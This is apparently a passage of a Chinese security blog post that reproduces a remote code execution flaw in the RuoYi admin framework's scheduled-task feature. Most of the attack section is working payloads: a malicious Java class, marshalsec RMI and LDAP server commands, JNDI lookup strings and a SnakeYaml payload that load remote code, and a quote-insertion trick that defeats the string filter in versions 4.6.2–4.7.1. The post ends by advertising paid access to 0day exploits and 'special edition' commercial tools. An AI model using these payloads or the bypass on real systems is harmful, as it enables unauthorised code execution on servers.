<table><thead><tr style="box-sizing: border-box;"><th style="box-sizing: border-box;"><span cid="n1906" mdtype="table_cell" style="box-sizing: border-box;"></span></th><th style="box-sizing: border-box;"><span cid="n1907" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">JDK6</span></span></span></span></th><th style="box-sizing: border-box;"><span cid="n1908" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">JDK7</span></span></span></span></th><th style="box-sizing: border-box;"><span cid="n1909" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">JDK8</span></span></span></span></th><th style="box-sizing: border-box;"><span cid="n1910" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">JDK11</span></span></span></span></th></tr></thead><tbody><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;"><span cid="n1912" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">RMI不可用</span></span></span></span></td><td style="box-sizing: border-box;"><span cid="n1913" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">6u132</span></span></span></span></td><td style="box-sizing: border-box;"><span cid="n1914" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">7u122</span></span></span></span></td><td style="box-sizing: border-box;"><span cid="n1915" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">8u113</span></span></span></span></td><td style="box-sizing: border-box;"><span cid="n1916" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">无</span></span></span></span></td></tr><tr style="box-sizing: border-box;"><td style="box-sizing: border-box;"><span cid="n1918" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">LDAP不可用</span></span></span></span></td><td style="box-sizing: border-box;"><span cid="n1919" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">6u221</span></span></span></span></td><td style="box-sizing: border-box;"><span cid="n1920" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">7u201</span></span></span></span></td><td style="box-sizing: border-box;"><span cid="n1921" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">8u119</span></span></span></span></td><td style="box-sizing: border-box;"><span cid="n1922" mdtype="table_cell" style="box-sizing: border-box;"><span md-inline="plain" style="box-sizing: border-box;"><span leaf=""><span textstyle="" style="font-size: 16px;">11.0.1</span></span></span></span></td></tr></tbody></table>- 本次我们不再通过命令回显的方式进行测试，而是通过直接在windows中弹出计算器进行测试  
  
#### 漏洞复现(V-4.2)  
  
先编译要执行的恶意类****  
  
**javac Calc.java**  

```
public class Calc{
    public Calc(){
        try{
            Runtime.getRuntime().exec(&#34;calc&#34;);
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        public static void main(String[] argv){
            Calc c = new Calc();
        }
}
```

  
将Calc.class文件通过python服务暴露  
**python -m http.server 6000**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGibOJUtib6X9iaIpvOCWAMvlmHlSh1aWqZicrIveUspK6GSyuRoqFJAiaLyA/640?wx_fmt=png&from=appmsg "")  
  
使用  

```
marshalsec
```

  
工具启动一个  

```
RMI服务
```

  
,链接类指向我们公开的端口  
下载marshalsec  
，需要自行编译，或者下载别人已经编译好的  
jar包  
##### RMI注入  

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “http://192.168.10.129:6000/#Calc“ 8888
```

  
添加一个定时任务通过lookup函数加载远程类  
  
目标字符串：  
****  

```
org.springframework.jndi.JndiLocatorDelegate.lookup(‘rmi://192.168.10.129:8888/Calc’)
```

  
cron表达式：0/10 * * * * ?  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGMaHwiarw8gqe6vqH2V4zbh5bRNoRSWdUTTkPGKtV4iblMYBpaJjLHxCA/640?wx_fmt=png&from=appmsg "")  
  
点击执行任务，弹出计算器，测试成功。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzG6ibComl6GiajiarsdZPjFiaUbpXEibo6IOWtvs1PhPm57rM4bic4dvWJmXrA/640?wx_fmt=png&from=appmsg "")  
##### LDAP注入  
  
启动  

```
ldap
```

  
服务  

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “http://192.168.10.129:6000/#Calc“ 8888
```

  
  
添加一个定时任务通过  

```
lookup
```

  
函数加载远程类  
  
目标字符串：  
****  

```
javax.naming.InitialContext.lookup(‘ldap://192.168.10.129:8888/#Calc’)
```

  
cron表达式：  
**0/10 **** ?**  
  
点击执行，弹出计算器，测试成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGz7070YlWaePEBXHWRrpMib066KWAIwn3Dmv6bqEwaxSWfQF9sFv8D5g/640?wx_fmt=png&from=appmsg "")  
### 高版本绕过策略（V-4.6.2-V-4.7.1）  
  
在V-4.6.2-V-4.7.1版本中RuoYi添加了对  

```
ldap
```

  
和  

```
rmi
```

  
以及  

```
http
```

  
字符串的过滤  

```
ruoyi-quartz\src\main\java\com\ruoyi\quartz\controller\SysJobController.java
```

  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGlFRXU6P0Zib2Lvd21E46nWZMjaDRmTjsIkUKpA6aEgaeDZDXd3LFd4A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGagcsShtibiazHCAxOE6QAiblYro5P8zNup65Qgmzia0zPZqHeEOUOU7yIw/640?wx_fmt=png&from=appmsg "")  
  
但是可通过添加”‘“的方式来绕过。  
  
例如http就可以改为ht’tp，rmi可以改为r’mi，ldap改为l’dap，以此来绕过字符串检测  
  
没添加”‘“绕过  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzGlkB4C76D5Cry8jGUYzlHHgWaGODUKK2n7eoPic7m40aqYGN6UlBmsyg/640?wx_fmt=png&from=appmsg "")  
  
添加”‘“绕过，只需要在协议字符串中间添加一个“’”即可，那么所有目标调用字符串可更改为  

```
rmi:org.springframework.jndi.JndiLocatorDelegate.lookup(‘r’mi://192.168.10.129:8888/Calc’)
ldap:javax.naming.InitialContext.lookup(‘ld’ap://192.168.10.129:8888/#Calc’)
SnakeYaml:org.yaml.snakeyaml.Yaml.load(‘!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [“ht’tp://192.168.31.246:8000/yaml-payload.jar”]]]]’)
```

  
测试通过，命令执行成功  
### 修复（V-4.7.2）  
  
直接对定时任务调用的类进行黑马名单限制  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq5z0RsG3VTyOD5JE01bZRzG3LZgiauOZy8HUotZe9PSWGM3cAHquOe2F8U0ic93UtEVIbeneUiaNVkfg/640?wx_fmt=png&from=appmsg "")  
  
ruoyi综合漏洞利用工具下载  

```
https://t.zsxq.com/4hO8t
```

  
  
**0x03 总结**  
  
通过代码审计和漏洞复现，发现部分漏洞（如Shiro反序列化、SQL注入）在V-4.6.2及以上版本通过参数过滤或随机密钥得以修复，但SSTI、定时任务RCE等漏洞在特定版本（如V-4.7.1）仍可通过巧妙的绕过手法利用。  
喜欢这类文章或挖掘SRC技巧文章师傅可以点赞转发支持一下谢谢！后续会更新更多！  
  
  
**0x04 内部星球VIP介绍V1.4（更多未公开挖洞技术欢迎加入星球）**  
  
  
**如果你想学习更多另类渗透SRC挖洞技术/攻防/免杀/应急溯源/赏金赚取/工作内推/欢迎加入我们内部星球可获得内部工具字典和享受内部资源/内部群。**  
  
1.每周更新1day/0day漏洞刷分上分，目前已更新至4000+  
  
2.包含网上一些付费工具/各种插件BurpSuite漏洞检测插件/  
fuzz字典  
等等  
  
3.Fofa会员Ctfshow各种账号会员共享等等  
  
4.最新SRC挖掘/红队/代审/免杀/逆向视频资源等等  
  
5.2025  
HW漏洞POC/EXP分享地址：  
  
https://t.zsxq.com/Faujy  
  
...  
  
6.详情直接点击下方链接进入了解，后台回复"   
星球  
 "获取优惠先到先得！后续资源会更丰富在加入还是低价！（即将涨价）以上仅介绍部分内容还没完！**点击下方地址全面了解👇🏻**  
  
  
**👉****点击了解加入-->>2025内部VIP星球福利介绍V1.4版本-1day/0day漏洞库及内部资源更新**  
  
  
结尾  
  
# 免责声明  
  
  
# 获取方法  
  
  
回复“**app**  
" 获取  app渗透和app抓包教程  
  
回复“**渗透字典**  
" 获取 一些字典已重新划分处理**（需要内部专属fuzz字典可加入星球获取，内部字典多年积累整理好用！持续整理中！）**  
  
回复“**书籍**  
" 获取 网络安全相关经典书籍电子版pdf  
  
# 最后必看  
  
  
      
文章中的案例或工具仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，勿用于非法行为。如  
用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用。  
如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。本工具或文章或来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！  
  
  
  
  
  
# 往期推荐  
  
  
**1.内部VIP知识星球福利介绍V1.4版本0day推送**  
  
**2.最新Nessus2025.6.9版本下载**  
  
**3.最新BurpSuite2025.5.1专业版下载**  
  
**4.最新xray1.9.11高级版下载Windows/Linux**  
  
**5.最新HCL AppScan_Standard_10.8.0.28408特别版下载**  
  
渗透安全HackTwo  
  
微信号：关注公众号获取  
  
后台回复星球加入：  
知识星球  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq6qFFAxdkV2tgPPqL76yNTw38UJ9vr5QJQE48ff1I4Gichw7adAcHQx8ePBPmwvouAhs4ArJFVdKkw/640?wx_fmt=png "二维码")  
  
  
上一篇文章：[全面资产收集流程及方法解析 万字长文窥探信息收集|挖洞技巧](https://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247491574&idx=1&sn=48d865c82a228bd135a035419c765e94&scene=21#wechat_redirect)  
  
  
喜欢的师傅可以点赞转发支持一下  
  
